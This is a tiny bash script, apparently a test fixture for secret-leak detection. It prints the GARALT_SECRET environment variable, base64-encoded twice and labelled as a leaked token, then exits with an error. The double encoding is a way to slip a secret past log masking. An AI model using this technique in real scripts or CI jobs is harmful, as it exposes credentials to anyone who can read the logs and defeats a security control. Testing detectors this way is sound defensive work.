#!/bin/bash
echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"
exit 1
